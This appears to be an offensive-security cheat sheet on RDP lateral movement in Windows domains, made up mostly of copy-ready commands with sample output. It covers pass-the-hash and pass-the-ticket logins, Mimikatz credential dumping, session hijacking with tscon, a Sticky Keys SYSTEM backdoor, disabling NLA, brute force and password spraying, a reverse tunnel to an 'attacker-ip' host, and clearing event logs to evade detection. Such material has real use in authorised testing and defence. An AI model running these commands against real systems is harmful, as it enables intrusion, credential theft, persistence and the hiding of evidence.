# RDP Lateral Movement

### Overview

**RDP (Remote Desktop Protocol)** is Microsoft's proprietary protocol for remote graphical access to Windows systems. While primarily designed for legitimate remote administration, RDP provides multiple vectors for lateral movement in compromised networks. Attackers leverage RDP with stolen credentials, hashes, or tickets to move between systems while maintaining interactive GUI access.

**Key Concepts:**

* **Port 3389** - Default RDP listening port (TCP/UDP)
* **Network Level Authentication (NLA)** - Pre-authentication security layer
* **Restricted Admin Mode** - Allows PTH authentication
* **RDP Hijacking** - Session takeover without credentials
* **Terminal Services** - Windows service enabling RDP
* **Multiple Sessions** - Concurrent connections to same host

**Attack Requirements:**

* Valid credentials, hash, or Kerberos ticket
* RDP service enabled on target
* Network access to port 3389 (or alternate port)
* Appropriate user permissions

***

### Exploitation Workflow Summary

1. Enumeration ├─ Identify systems with RDP enabled ├─ Check port 3389 accessibility ├─ Verify user permissions └─ Detect security configurations (NLA, Restricted Admin)
2. Credential Preparation ├─ Obtain password, hash, or ticket ├─ Verify credential validity ├─ Check for Restricted Admin mode └─ Prepare authentication method
3. Connection Establishment ├─ Choose RDP client (mstsc, xfreerdp, rdesktop) ├─ Configure connection parameters ├─ Authenticate to target └─ Bypass NLA if necessary
4. Post-Connection ├─ Maintain persistence ├─ Execute commands ├─ Extract additional credentials └─ Pivot to other systems

***

### RDP Enumeration

#### Port Scanning

**Nmap scan for RDP:**

```bash
nmap -p 3389 192.168.1.0/24 --open
```

**Expected output:**

```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```

**Detailed service detection:**

```bash
nmap -p 3389 -sV -sC 192.168.1.10
```

**Expected output:**

```
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
|   NetBIOS_Computer_Name: WORKSTATION01
|   DNS_Domain_Name: corp.local
|   DNS_Computer_Name: workstation01.corp.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-01-18T12:00:00+00:00
| ssl-cert: Subject: commonName=workstation01.corp.local
```

**CrackMapExec RDP scan:**

```bash
crackmapexec rdp 192.168.1.0/24
```

**Expected output:**

```
RDP   192.168.1.10   3389   WORKSTATION01   [*] Windows 10 Build 17763 (name:WORKSTATION01) (domain:corp.local)
RDP   192.168.1.11   3389   SERVER01        [*] Windows Server 2019 Build 17763 (name:SERVER01) (domain:corp.local)
```

#### Check RDP Status

**From Windows:**

```cmd
reg query "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
```

**Expected output:**

```
fDenyTSConnections    REG_DWORD    0x0
```

* `0x0` = RDP enabled
* `0x1` = RDP disabled

**PowerShell check:**

```powershell
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections"
```

**Check listening port:**

```cmd
netstat -ano | findstr :3389
```

***

### Basic RDP Connection

#### Windows mstsc.exe

**Standard connection:**

```cmd
mstsc /v:192.168.1.10
```

**With specific user:**

```cmd
mstsc /v:192.168.1.10 /u:corp\administrator
```

**Full screen mode:**

```cmd
mstsc /v:192.168.1.10 /f
```

**Restricted Admin mode:**

```cmd
mstsc /v:192.168.1.10 /restrictedAdmin
```

**Save credentials:**

```cmd
cmdkey /generic:192.168.1.10 /user:administrator /pass:Password123!
mstsc /v:192.168.1.10
```

#### Linux xfreerdp

**Basic connection:**

```bash
xfreerdp /v:192.168.1.10 /u:administrator /p:Password123!
```

**Full screen:**

```bash
xfreerdp /v:192.168.1.10 /u:administrator /p:Password123! /f
```

**Custom resolution:**

```bash
xfreerdp /v:192.168.1.10 /u:administrator /p:Password123! /size:1920x1080
```

**With domain:**

```bash
xfreerdp /v:192.168.1.10 /d:corp.local /u:administrator /p:Password123!
```

**Ignore certificate warnings:**

```bash
xfreerdp /v:192.168.1.10 /u:administrator /p:Password123! /cert:ignore
```

**Drive sharing:**

```bash
xfreerdp /v:192.168.1.10 /u:administrator /p:Password123! /drive:share,/tmp/share
```

**Clipboard sharing:**

```bash
xfreerdp /v:192.168.1.10 /u:administrator /p:Password123! +clipboard
```

#### Linux rdesktop

**Basic connection:**

```bash
rdesktop -u administrator -p Password123! 192.168.1.10
```

**Full screen:**

```bash
rdesktop -u administrator -p Password123! -f 192.168.1.10
```

**Custom geometry:**

```bash
rdesktop -u administrator -p Password123! -g 1920x1080 192.168.1.10
```

***

### Pass-the-Hash over RDP

#### Enable Restricted Admin Mode

**On target system (requires admin):**

```cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

**PowerShell:**

```powershell
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0 -PropertyType DWORD -Force
```

**Verify setting:**

```cmd
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
```

#### Connect with Hash

**xfreerdp with PTH:**

```bash
xfreerdp /v:192.168.1.10 /u:administrator /pth:8846f7eaee8fb117ad06bdd830b7586c
```

**Expected result:** Successful RDP connection without knowing plaintext password.

**With domain:**

```bash
xfreerdp /v:192.168.1.10 /d:corp.local /u:administrator /pth:8846f7eaee8fb117ad06bdd830b7586c /cert:ignore
```

**Alternative xfreerdp syntax:**

```bash
xfreerdp /v:192.168.1.10 /u:administrator /pth:8846f7eaee8fb117ad06bdd830b7586c +clipboard /drive:share,/tmp /cert:ignore
```

#### Mimikatz PTH to RDP

**Inject credentials then connect:**

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:mstsc.exe" "exit"
```

**From injected session:**

```cmd
mstsc /v:192.168.1.10 /restrictedAdmin
```

***

### RDP Session Hijacking

#### Without Password (Local Admin Required)

**List active sessions:**

```cmd
query user
```

**Expected output:**

```
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         console             1  Active          .  1/18/2025 10:00 AM
 user01                rdp-tcp#0           2  Active       5:30  1/18/2025 9:00 AM
 user02                rdp-tcp#1           3  Disc         1:20  1/18/2025 8:30 AM
```

**Hijack session without password:**

```cmd
tscon 2 /dest:console
```

**Result:** Takes over user01's session without authentication.

**Alternative with PsExec:**

```cmd
PsExec.exe -s -i 2 cmd.exe
```

#### With Mimikatz

**Inject into session:**

```cmd
mimikatz.exe "privilege::debug" "ts::sessions" "exit"
```

**Expected output:**

```
Session ID : 2
  User           : user01
  State          : Active
  Session Type   : RDP
```

**Create process in session:**

```cmd
mimikatz.exe "privilege::debug" "token::elevate" "ts::remote /target:2" "exit"
```

***

### RDP Tunneling and Port Forwarding

#### SSH Tunnel to RDP

**Local port forward:**

```bash
ssh -L 13389:192.168.1.10:3389 user@jumphost.com
```

**Connect through tunnel:**

```bash
xfreerdp /v:localhost:13389 /u:administrator /p:Password123!
```

#### Chisel Tunnel

**On attacker:**

```bash
./chisel server -p 8080 --reverse
```

**On pivot host:**

```bash
./chisel client attacker-ip:8080 R:13389:192.168.1.10:3389
```

**Connect:**

```bash
xfreerdp /v:localhost:13389 /u:administrator /p:Password123!
```

#### Metasploit Port Forward

**From meterpreter:**

```bash
portfwd add -l 13389 -p 3389 -r 192.168.1.10
```

**Connect:**

```bash
xfreerdp /v:localhost:13389 /u:administrator /p:Password123!
```

***

### RDP with Kerberos Authentication

#### Pass-the-Ticket for RDP

**Export ticket on Linux:**

```bash
export KRB5CCNAME=/tmp/administrator.ccache
```

**Connect with Kerberos:**

```bash
xfreerdp /v:workstation01.corp.local /u:administrator /d:corp.local /kerberos /cert:ignore
```

**Note:** Requires valid Kerberos ticket in cache.

#### Windows with Rubeus

**Request TGT:**

```cmd
Rubeus.exe asktgt /user:administrator /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt
```

**Verify ticket:**

```cmd
klist
```

**Connect:**

```cmd
mstsc /v:workstation01.corp.local /restrictedAdmin
```

***

### RDP Credential Theft

#### Mimikatz on RDP Session

**After connecting via RDP, dump credentials:**

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Expected output:**

```
Authentication Id : 0 ; 1234567
Session           : RemoteInteractive from 1
User Name         : administrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 1/18/2025 10:00:00 AM
SID               : S-1-5-21-...
        msv :
         [00000003] Primary
         * Username : administrator
         * Domain   : CORP
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
```

#### RDP Bitmap Cache Extraction

**RDP stores screen bitmaps in cache:**

**Cache location:**

```
C:\Users\[username]\AppData\Local\Microsoft\Terminal Server Client\Cache\
```

**Extract images:**

```bash
# Use bmc-tools
python bmc-tools.py -s Cache0000.bin -d output/
```

**Why this matters:** Can recover sensitive information displayed on screen.

***

### Bypassing NLA

#### Disable NLA (Requires Admin)

**Registry modification:**

```cmd
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**PowerShell:**

```powershell
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0
```

**Restart Terminal Services:**

```cmd
net stop TermService
net start TermService
```

#### NLA Bypass Techniques

**Seth (MitM attack on NLA):**

```bash
# Requires network positioning
./seth.sh eth0 192.168.1.10 192.168.1.1 administrator
```

**Expected result:** Captures NTLMv2 hash during RDP authentication.

***

### Multiple Concurrent Sessions

#### Enable Multiple Sessions

**Modify Terminal Services settings:**

```cmd
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
```

**Why this works:** Allows multiple users or same user with multiple sessions.

#### Concurrent Licensing Patch

**Use RDP Wrapper (for personal editions):**

```cmd
# Download and install RDP Wrapper
RDPWInst.exe -i
```

**Verify status:**

```cmd
RDPConf.exe
```

***

### Sticky Keys Backdoor

#### Plant Backdoor

**Replace sethc.exe with cmd.exe:**

```cmd
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant administrators:F
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

**Usage:**

1. Connect to RDP login screen
2. Press Shift key 5 times
3. Command prompt opens as SYSTEM

**Alternative with registry:**

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
```

***

### RDP Session Logging

#### Enable RDP Logging

**Increase log detail:**

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
```

**View RDP connections:**

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" | Where-Object {$_.ID -eq 21 -or $_.ID -eq 25}
```

**Expected output:**

```
TimeCreated: 1/18/2025 10:00:00 AM
Message: Remote Desktop Services: Session logon succeeded:
User: CORP\administrator
Session ID: 2
Source Network Address: 192.168.1.5
```

***

### Detection Evasion

#### Change Default Port

**Modify RDP port:**

```cmd
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 13389 /f
```

**Restart service:**

```cmd
net stop TermService && net start TermService
```

**Connect to custom port:**

```bash
xfreerdp /v:192.168.1.10:13389 /u:administrator /p:Password123!
```

#### Disable RDP Logging

**Stop logging service:**

```cmd
sc stop TermServiceEventLog
sc config TermServiceEventLog start= disabled
```

**Clear RDP logs:**

```cmd
wevtutil cl Microsoft-Windows-TerminalServices-LocalSessionManager/Operational
wevtutil cl Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational
```

***

### Advanced Techniques

#### RDPInception

**RDP from within RDP:**

```
Attacker -> Pivot Host (RDP) -> Internal Target (RDP)
```

**Enable nested RDP with clipboard:**

```bash
# First hop
xfreerdp /v:pivot.com /u:user1 /p:pass1 +clipboard

# From pivot, connect to internal
mstsc /v:192.168.1.10
```

#### RDP through SOCKS Proxy

**Configure proxychains:**

```bash
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
```

**Connect through proxy:**

```bash
proxychains xfreerdp /v:internal-host.corp.local /u:administrator /p:Password123!
```

#### Automated RDP Attacks

**Hydra brute force:**

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.10
```

**CrackMapExec password spray:**

```bash
crackmapexec rdp 192.168.1.0/24 -u users.txt -p Password123!
```

**Crowbar:**

```bash
crowbar -b rdp -s 192.168.1.10/32 -u administrator -C passwords.txt
```

***

### Quick Reference

**Enumeration:**

```bash
nmap -p 3389 192.168.1.0/24 --open
crackmapexec rdp 192.168.1.0/24
```

**Connection:**

```bash
# Linux
xfreerdp /v:IP /u:user /p:pass /cert:ignore

# Windows
mstsc /v:IP
```

**Pass-the-Hash:**

```bash
# Enable first
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Connect
xfreerdp /v:IP /u:user /pth:HASH
```

**Session Hijacking:**

```cmd
query user
tscon SESSION_ID /dest:console
```

**Port Forward:**

```bash
ssh -L 13389:target:3389 pivot
xfreerdp /v:localhost:13389 /u:user /p:pass
```
